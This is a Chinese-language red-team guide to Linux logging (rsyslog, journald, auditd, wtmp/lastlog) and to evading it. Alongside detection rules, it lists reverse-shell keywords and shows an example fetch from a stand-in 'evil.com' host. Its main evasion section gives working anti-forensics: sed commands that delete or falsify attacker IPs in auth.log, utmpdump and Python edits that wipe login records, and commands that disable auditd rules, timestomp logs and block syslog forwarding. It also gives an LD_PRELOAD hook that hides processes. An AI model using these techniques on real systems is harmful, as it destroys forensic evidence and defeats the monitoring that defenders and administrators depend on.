# Linux 日志系统与逃逸技术

> 理解 Linux 日志架构才能有效规避；理解规避手段才能有效检测

---

## 一、Linux 日志架构

### 1.1 syslog/rsyslog/syslog-ng

```
传统 Linux 日志架构:
├─ syslog — 最早的日志标准（RFC 3164/5424）
├─ rsyslog — 增强版 syslog（大多数 RHEL/Debian 默认）
│   ├─ 配置: /etc/rsyslog.conf, /etc/rsyslog.d/
│   ├─ 支持 TCP/UDP 远程转发
│   ├─ 支持模板和过滤器
│   └─ 支持数据库输出（MySQL/PostgreSQL）
├─ syslog-ng — 另一个增强方案
│   ├─ 配置: /etc/syslog-ng/syslog-ng.conf
│   ├─ 更灵活的路由和过滤
│   └─ 支持 TLS 加密传输
└─ 日志级别: emerg > alert > crit > err > warning > notice > info > debug

facility 分类:
├─ auth/authpriv — 认证相关
├─ cron — 定时任务
├─ daemon — 系统守护进程
├─ kern — 内核
├─ user — 用户空间程序
├─ local0-local7 — 自定义
└─ syslog — syslog 系统自身
```

### 1.2 systemd-journald

```
systemd-journald — 现代 Linux 日志系统:
├─ 二进制格式（非文本）→ journalctl 查看
├─ 位置:
│   持久化: /var/log/journal/<machine-id>/
│   非持久化: /run/log/journal/（重启后消失）
├─ 默认行为:
│   如果 /var/log/journal/ 存在 → 持久化
│   如果不存在 → 仅存于 /run/（重启消失）
├─ 配置: /etc/systemd/journald.conf
│   Storage=persistent|volatile|auto|none
│   SystemMaxUse= — 最大磁盘使用量
│   MaxRetentionSec= — 最大保留时间
└─ 优势:
    ├─ 结构化日志（带元数据）
    ├─ 自动索引和压缩
    ├─ 可靠的二进制格式（防篡改难度更高）
    └─ 与 rsyslog 并行运行
```

### 1.3 auditd

```
auditd — Linux 内核审计框架:
├─ 内核空间审计 → 比用户空间日志更难绕过
├─ 配置: /etc/audit/auditd.conf
├─ 规则: /etc/audit/rules.d/ 或 auditctl
├─ 日志: /var/log/audit/audit.log
├─ 可审计:
│   ├─ 系统调用（execve, open, connect, etc.）
│   ├─ 文件访问（读/写/执行/属性变更）
│   ├─ 网络操作
│   ├─ 用户/组变更
│   └─ SELinux AVC 事件
└─ 关键: 内核级监控 → 用户态无法完全绕过
```

### 1.4 wtmp/utmp/btmp/lastlog

```
二进制登录记录:
├─ /var/run/utmp — 当前登录用户（实时）
│   命令: who, w, finger
├─ /var/log/wtmp — 历史登录/注销记录
│   命令: last
├─ /var/log/btmp — 失败登录记录
│   命令: lastb
└─ /var/log/lastlog — 每个用户最后登录时间
    命令: lastlog

数据结构 (struct utmp):
├─ ut_type — 记录类型（USER_PROCESS, LOGIN_PROCESS, etc.）
├─ ut_pid — 进程 ID
├─ ut_line — 终端（tty/pts）
├─ ut_user — 用户名
├─ ut_host — 远程主机名/IP
├─ ut_tv — 时间戳
└─ ut_addr_v6 — IPv6 地址
```

---

## 二、关键日志位置与格式

### 2.1 认证日志

```
/var/log/auth.log (Debian/Ubuntu) 或 /var/log/secure (RHEL/CentOS):

关键事件:
├─ SSH 登录成功: "Accepted publickey/password for USER from IP port PORT"
├─ SSH 登录失败: "Failed password for USER from IP port PORT"
├─ SSH 无效用户: "Invalid user USERNAME from IP"
├─ sudo 执行: "USER : TTY=pts/0 ; PWD=/home/user ; USER=root ; COMMAND=..."
├─ su 切换: "Successful su for root by USER"
├─ su 失败: "FAILED su for root by USER"
├─ PAM 错误: "pam_unix(sshd:auth): authentication failure"
├─ 密钥认证: "Accepted publickey for USER from IP"
└─ 会话事件: "session opened/closed for user USER"
```

### 2.2 系统日志

```
/var/log/syslog (Debian) 或 /var/log/messages (RHEL):

关键事件:
├─ 服务启停: "systemd: Started/Stopped SERVICE"
├─ 内核消息: "kernel: ..."
├─ 网络变化: "NetworkManager: ..."
├─ USB 设备: "kernel: usb 1-1: new device"
├─ 驱动加载: "kernel: Loading module MODULE"
└─ 系统错误: 各种守护进程的错误信息
```

### 2.3 审计日志

```
/var/log/audit/audit.log:

格式: type=TYPE msg=audit(TIMESTAMP:ID): key1=value1 key2=value2 ...

关键类型:
├─ SYSCALL — 系统调用审计
│   type=SYSCALL ... syscall=59 ... exe="/usr/bin/curl" ...
│   (syscall 59 = execve)
├─ EXECVE — 命令执行参数
│   type=EXECVE ... a0="curl" a1="http://evil.com/payload" ...
├─ PATH — 文件路径访问
├─ USER_AUTH — 用户认证
├─ USER_LOGIN — 用户登录
├─ USER_CMD — 用户命令（sudo）
├─ CRED_ACQ — 凭据获取
├─ ANOM_PROMISCUOUS — 网卡混杂模式（嗅探检测）
└─ CONFIG_CHANGE — 审计配置变更
```

### 2.4 应用日志

```
Apache:
├─ /var/log/apache2/access.log — 访问日志
│   格式: IP - - [TIMESTAMP] "METHOD PATH VERSION" STATUS SIZE
├─ /var/log/apache2/error.log — 错误日志
└─ 自定义日志路径在 VirtualHost 中配置

Nginx:
├─ /var/log/nginx/access.log
├─ /var/log/nginx/error.log
└─ 格式可在 nginx.conf 中自定义

MySQL:
├─ /var/log/mysql/error.log — 错误日志
├─ /var/log/mysql/mysql.log — 通用查询日志（通常关闭）
├─ /var/log/mysql/slow.log — 慢查询日志
└─ 二进制日志 (binlog) — 数据变更记录

Docker:
├─ /var/lib/docker/containers/<ID>/<ID>-json.log — 容器日志
└─ docker logs <container> 查看
```

---

## 三、检测规则（红队需了解）

### 3.1 auditd 规则

```bash
# 查看当前规则
auditctl -l

# 常见检测规则:
# 命令执行审计（所有 execve）
-a always,exit -F arch=b64 -S execve -k exec_log

# 敏感文件访问
-w /etc/passwd -p wa -k identity
-w /etc/shadow -p wa -k identity
-w /etc/sudoers -p wa -k sudoers_change
-w /etc/ssh/sshd_config -p wa -k sshd_config

# 网络连接
-a always,exit -F arch=b64 -S connect -k network_connect
-a always,exit -F arch=b64 -S bind -k network_bind

# 权限变更
-a always,exit -F arch=b64 -S chmod -S fchmod -k perm_change
-a always,exit -F arch=b64 -S chown -S fchown -k owner_change

# 模块加载（Rootkit 检测）
-w /sbin/insmod -p x -k modules
-w /sbin/rmmod -p x -k modules
-w /sbin/modprobe -p x -k modules

# 审计日志篡改检测
-w /var/log/audit/ -p wa -k audit_log_modify
-w /etc/audit/ -p wa -k audit_config_modify
```

### 3.2 SIGMA Rules for Linux

```yaml
# 检测可疑命令执行
title: Suspicious Linux Command Execution
logsource:
    product: linux
    service: auditd
detection:
    selection:
        type: EXECVE
    keywords:
        - 'wget'
        - 'curl'
        - 'base64'
        - 'python -c'
        - 'perl -e'
        - '/dev/tcp/'
        - 'nc -e'
        - 'ncat -e'
        - 'bash -i'
        - 'pty.spawn'
    condition: selection and keywords
level: high
```

### 3.3 osquery 查询

```sql
-- 检测异常进程
SELECT name, path, cmdline, uid, parent
FROM processes
WHERE path NOT LIKE '/usr/%' AND path NOT LIKE '/bin/%'
  AND path NOT LIKE '/sbin/%';

-- 检测 SSH authorized_keys 变更
SELECT * FROM authorized_keys
WHERE key NOT IN (SELECT key FROM known_good_keys);

-- 检测 cron 持久化
SELECT * FROM crontab;

-- 检测异常网络连接
SELECT p.name, p.path, pa.remote_address, pa.remote_port
FROM process_open_sockets pa
JOIN processes p ON pa.pid = p.pid
WHERE pa.remote_port NOT IN (80, 443, 53, 22)
  AND pa.remote_address != '127.0.0.1';

-- 检测 history 文件被清除
SELECT * FROM file
WHERE path LIKE '/home/%/.bash_history'
  AND size = 0;
```

---

## 四、日志逃逸技术

### 4.1 实时日志删除 vs 选择性编辑

```
策略对比:
├─ 清空整个日志文件 ⛔
│   echo > /var/log/auth.log
│   → 极其可疑！文件大小突然归零
│   → SIEM 会检测到日志断流
│   → 管理员立即注意到
│
├─ 删除特定行（选择性编辑）✓
│   sed -i '/ATTACKER_IP/d' /var/log/auth.log
│   → 仅移除包含攻击者 IP 的行
│   → 其余日志保持正常
│   → 更隐蔽但仍可通过 SIEM 对比发现
│
├─ 修改而非删除 ✓✓
│   sed -i 's/ATTACKER_IP/LEGITIMATE_IP/g' /var/log/auth.log
│   → 将攻击者 IP 替换为合法 IP
│   → 日志行数不变，时间线完整
│   → 最难被发现
│
└─ 从一开始不产生日志 ✓✓✓
    → 最优策略（见下文）
```

### 4.2 utmpdump 编辑 wtmp/utmp

```bash
# wtmp/utmp 是二进制文件 → 不能直接 sed 编辑

# Step 1: 导出为文本
utmpdump /var/log/wtmp > wtmp.txt

# 文本格式:
# [7] [01234] [pts/0] [user] [192.168.1.100] [192.168.1.100] [2025-03-15T10:30:00,000000+00:00]

# Step 2: 编辑文本 → 删除或修改攻击者记录
# 删除包含攻击者 IP 的行
grep -v "ATTACKER_IP" wtmp.txt > wtmp_clean.txt

# 或修改 IP/用户名
sed -i 's/ATTACKER_IP/10.0.0.1/g' wtmp_clean.txt

# Step 3: 转回二进制
utmpdump -r < wtmp_clean.txt > /var/log/wtmp

# 同样处理 utmp
utmpdump /var/run/utmp > utmp.txt
# 编辑...
utmpdump -r < utmp.txt > /var/run/utmp

# lastlog 编辑:
# lastlog 是固定大小记录（每个 UID 一条）
# 需要计算偏移量直接用 dd 或 python 修改

python3 -c "
import struct, os
# lastlog 记录大小: 292 bytes (ll_time=4, ll_line=32, ll_host=256)
RECORD_SIZE = 292
uid = 1000  # 目标 UID
offset = uid * RECORD_SIZE
with open('/var/log/lastlog', 'r+b') as f:
    f.seek(offset)
    f.write(b'\x00' * RECORD_SIZE)  # 清除该用户的 lastlog 记录
"
```

### 4.3 禁用 auditd

```bash
# 方法 1: 关闭审计（需 root）
auditctl -e 0
# 效果: 停止所有审计事件记录
# ⛔ 注意: 这个操作本身会被记录为 CONFIG_CHANGE

# 方法 2: 删除所有规则
auditctl -D
# 移除所有审计规则但保持 auditd 运行
# 更隐蔽 — 服务仍在运行但不记录任何事件

# 方法 3: 停止 auditd 服务
systemctl stop auditd
# ⛔ 会产生 service stop 日志

# 方法 4: 临时禁用特定规则
auditctl -d always,exit -F arch=b64 -S execve -k exec_log
# 只删除特定规则 → 更精准

# 方法 5: 修改 auditd.conf 减少记录
# max_log_file = 1  → 日志文件最大 1MB
# num_logs = 1      → 只保留 1 个文件
# → 日志快速轮转覆盖

# 恢复（操作完成后）
auditctl -e 1
# 或恢复规则
auditctl -R /etc/audit/rules.d/audit.rules
```

### 4.4 Timestomping Log Entries

```bash
# 修改日志文件时间戳（掩盖编辑时间）
touch -r /var/log/syslog /var/log/auth.log
# 让 auth.log 的时间戳与 syslog 一致

# 修改日志内容中的时间戳（文本日志）
# syslog 格式: "Mar 15 10:30:00 hostname sshd[1234]: ..."
# 修改时间戳让恶意操作看起来发生在不同时间
sed -i 's/Mar 15 10:30:00/Mar 14 03:15:00/g' /var/log/auth.log

# systemd journal 时间戳在二进制结构中 → 不能简单 sed
# 需要专门工具或直接删除 journal 文件
```

### 4.5 利用 logrotate 机制

```bash
# 强制立即轮转
logrotate -f /etc/logrotate.d/rsyslog

# 修改保留策略（减少保留周期）
# /etc/logrotate.d/rsyslog:
# rotate 1          # 只保留 1 个归档
# daily             # 每天轮转
# compress          # 压缩归档
# delaycompress     # 延迟一次压缩

# 效果:
# ├─ 当前 auth.log → auth.log.1 → auth.log.2.gz → 删除
# ├─ rotate 1 → 只保留 auth.log.1
# └─ 攻击者的日志在下次轮转后被删除
```

### 4.6 远程 syslog 对抗

```
现代部署常将日志实时转发到远程 SIEM → 本地清除无效

对抗方法:
├─ 1. 阻断 syslog 转发
│   iptables -A OUTPUT -p tcp --dport 514 -j DROP   # TCP syslog
│   iptables -A OUTPUT -p udp --dport 514 -j DROP   # UDP syslog
│   iptables -A OUTPUT -p tcp --dport 6514 -j DROP  # TLS syslog
│   ⛔ SIEM 会检测到日志断流 → 告警
│
├─ 2. 修改 rsyslog 配置
│   注释掉远程转发行: # *.* @@remote-siem:514
│   systemctl restart rsyslog
│   ⛔ rsyslog 重启会被记录
│
├─ 3. 中间人（不推荐）
│   ARP 欺骗截获 syslog 流量 → 丢弃或修改
│   仅在 UDP syslog 场景可行
│
├─ 4. 最佳方案: 从一开始不产生日志
│   使用不触发日志的技术执行操作
│   → 内存执行、直接 syscall、避免 SSH 登录
│
└─ 5. 操作时间选择
    在日志量高峰期操作 → 隐藏在大量正常日志中
    SOC 分析师可能忽略高负载期间的异常
```

### 4.7 In-memory Execution 避免产生日志

```bash
# 关键原则: 不通过会产生日志的途径执行

# 避免 SSH 登录（auth.log 记录）
# → 使用 Web Shell / 已有 C2 channel

# 避免 sudo（auth.log 记录）
# → 使用已有 root session 或内核提权

# 避免 execve（auditd 记录）
# → 使用 LD_PRELOAD 或 /proc/self/mem 直接执行

# 避免文件操作（auditd inotify 记录）
# → 纯内存操作，不触碰文件系统
```

### 4.8 LD_PRELOAD Hooking

```c
// 通过 LD_PRELOAD 隐藏进程/连接
// 编译: gcc -shared -fPIC -o hide.so hide.c -ldl

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <dlfcn.h>
#include <dirent.h>

// Hook readdir 隐藏特定进程
struct dirent *readdir(DIR *dirp) {
    struct dirent *(*original_readdir)(DIR *) = dlsym(RTLD_NEXT, "readdir");
    struct dirent *entry;

    while ((entry = original_readdir(dirp)) != NULL) {
        // 隐藏名为 "malware" 的进程 PID 目录
        // 实际使用时通过 /proc/PID/cmdline 匹配
        if (strcmp(entry->d_name, "TARGET_PID") == 0)
            continue;
        return entry;
    }
    return NULL;
}

// 使用方法:
// export LD_PRELOAD=/path/to/hide.so
// ps aux  → 看不到隐藏的进程
// ls /proc/ → 看不到隐藏的 PID 目录

// ⛔ 注意:
// ├─ 只影响用户态工具（ps, ls, netstat）
// ├─ 不影响内核级审计（auditd, /proc 直接读取）
// ├─ 静态链接的工具不受影响
// └─ volatility 内存分析可以发现
```

---

## 五、对照表

| 蓝队监控 | 触发条件 | 红队对策 |
|----------|---------|---------|
| auth.log SSH 记录 | SSH 登录 | 避免 SSH，用 Web Shell / C2 |
| auth.log sudo 记录 | sudo 执行 | 直接 root session / 内核提权 |
| auditd execve | 命令执行 | 禁用规则 / memfd_create |
| wtmp/lastlog | 用户登录 | utmpdump 编辑 |
| .bash_history | Shell 命令 | unset HISTFILE |
| journal | 服务事件 | vacuum / 删除 journal 文件 |
| 远程 syslog | 所有日志 | 从源头阻止日志产生 |
| auditd 配置变更 | 规则修改 | 操作完后恢复 |

---

## 参考链接

- [auditd Documentation](https://access.redhat.com/documentation/en-us/red_hat_enterprise_linux/7/html/security_guide/chap-system_auditing)
- [rsyslog Documentation](https://www.rsyslog.com/doc/)
- [systemd-journald](https://www.freedesktop.org/software/systemd/man/systemd-journald.service.html)
- [SIGMA Rules - Linux](https://github.com/SigmaHQ/sigma/tree/master/rules/linux)
